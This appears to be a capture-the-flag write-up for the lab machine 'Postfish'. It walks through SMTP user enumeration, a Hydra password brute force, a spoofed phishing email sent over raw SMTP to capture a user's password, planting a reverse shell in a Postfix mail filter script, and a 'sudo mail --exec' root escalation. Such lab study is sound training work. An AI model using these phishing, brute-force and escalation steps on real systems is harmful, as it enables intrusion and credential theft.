---
description: Pg Practice Postfish writeup
---

# Postfish

## Nmap

```
sudo nmap 192.168.211.137 -p- -sS -sV -Pn

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Heading straight into SMTP I ran `smtp-user-enum.pl` with the syntax below:

```
sudo perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.211.137 
```

![](<../../../.gitbook/assets/image (1294).png>)

Looks like we have some non default emails shown above that are listed below:

```
hr
sales
```

Checking our port 80 from here we find the web page attempts to direct us to http://postfish.off. We can add the IP and domain name into `/etc/hosts` to get this working. Once completed the web pages should load correctly.

![](<../../../.gitbook/assets/image (1295) (1).png>)

Checking out the link for 'Our Team' shows further departments and users.

![](<../../../.gitbook/assets/image (1296).png>)

We can run the users against smtp-user-enum to try and identify further usernames. Companies generally use naming conventions so we will either try and guess it or use a tool to help us identify.

Download the following python script: [https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py](https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py)

We can then run the script against each user and this will generate variations of the username.

```
python2 exploit.py -n 'USER'  
```

![](<../../../.gitbook/assets/image (1298) (1).png>)

Repeat for each user and save the results into a text file. We can then run the variations against `smtp-user-enum` again.

```
perl smtp-user-enum.pl -M VRFY -U /home/kali/Desktop/known-users -t 192.168.211.137 
```

![](<../../../.gitbook/assets/image (1299).png>)

At this point I tried to brute force the various accounts we have over IMAP and POP3. I was able to get a valid result with Hydra for `sales:sales`.

The password list was generated with `cewl` from the [http://postfish.off/team.html](http://postfish.off/team.html) web page.

```
cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
```

I then run our known users names with the output generated from `cewl` against `Hydra`.

![](<../../../.gitbook/assets/image (1300).png>)

I then logged into the sales account with telnet on port 110 for POP3 and was able to retrieve a singular email message.

![](<../../../.gitbook/assets/image (1301).png>)

The email indicates the IT team (it@postfish.off) will be sending password reset links to the sales team. From here we can potentially spear phish someone. Looking at [http://postfish.off/team.html](http://postfish.off/team.html) again shows that Brian Moore is the sales manager. We already know his email address from earlier as well from our smtp enumeration.

First set up a `netcat` listener on port 80.

```
sudo nc -lvp 80
```

Next connect to SMTP using `netcat` then do the following to compose an email from it@postfish.off to brian.moore@postfish.off.

```
nc -v postfish.off 25
```

```
helo test
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA

Subject: Password reset process

Hi Brian,

Please follow this link to reset your password: http://192.168.49.211/                              

Regards,

.

QUIT
```

![](<../../../.gitbook/assets/image (1302) (1).png>)

After a short while Brian will send us details regarding his current login to our `netcat` listener.

![](<../../../.gitbook/assets/image (1303).png>)

We now have the password `EternaLSunshinE` We can then login to `SSH`.

```
ssh brian.more@192.168.211.137
```

![](<../../../.gitbook/assets/image (1304).png>)

I then transferred `linpeas` over to the target machine. After running we identify being a member of the 'filter' group which is a non default group. We also find /etc/postfix/disclaimer as being of interest.

![](<../../../.gitbook/assets/image (1305) (1).png>)

![](<../../../.gitbook/assets/image (1306).png>)

A Google search on 'postfix disclaimer' results in the following being the first result on Google: [https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze).

Looking through this it seems the admin on the box has followed the included steps to install and configure alterMIME to get disclaimers appended to emails.

![](<../../../.gitbook/assets/image (1307).png>)

Reading through the article essentially we see that for any emails included in the file `/etc/postfix/disclaimer_addresses`. When any of these addresses send or recieve an email the following file gets executed `/etc/postfix/disclaimer`. The file takes the contents of `/etc/postfix/disclaimer.txt` and appends it to the emails.

As we are a member the group 'filter' we can edit the script `/etc/postfix/disclaimer`. Using nano to edit the script I inserted a bash reverse shell to the top of the script.

![](<../../../.gitbook/assets/image (1308).png>)

Then like we did earlier I connected to SMTP with `netcat` and sent an email to trigger the shell.

```
helo test
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA

Shell please

.

QUIT
```

![](<../../../.gitbook/assets/image (1309) (1).png>)

After doing so we should receive a shell.

![](<../../../.gitbook/assets/image (1310).png>)

From here I checked sudo permissions with `sudo -l` and found that we can run the `mail` binary as any user without a password.

![](<../../../.gitbook/assets/image (1311).png>)

Referring to [GTFOBins](https://gtfobins.github.io/gtfobins/mail/) we can use this to gain a root shell.

![](<../../../.gitbook/assets/image (1312).png>)

```
sudo mail --exec='!/bin/bash'
```

We then gain a root shell.

![](<../../../.gitbook/assets/image (1313).png>)
